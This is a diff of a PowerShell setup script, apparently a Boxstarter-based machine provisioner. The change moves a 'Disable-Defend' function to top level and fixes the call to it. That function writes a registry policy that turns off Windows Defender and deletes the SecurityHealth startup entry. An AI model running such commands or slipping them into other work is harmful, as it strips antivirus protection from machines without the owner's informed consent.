@@ -95,6 +95,16 @@ function Test-PSProfile
 
 } 
 
+
+
+function Disable-Defend{
+
+  powershell Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Type DWord -Value 1
+  powershell Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SecurityHealth" -ErrorAction SilentlyContinue
+
+ }
+
+
 # Comprobar privilegios
 function Test-AdminExecution
 {
@@ -142,14 +152,6 @@ function Test-HostSupported
    }
  
    
-   function Disable-Defend{
-
-    powershell Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Type DWord -Value 1
-    powershell Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SecurityHealth" -ErrorAction SilentlyContinue
-
-   }
-
-
   
 }
 
@@ -170,7 +172,7 @@ function Install-Module{
   Test-HostSupported;
   Test-PSProfile;
   Install-Module;
-  Disable-Defend:
+  Disable-Defend;
   Install-BoxStarter
  
 
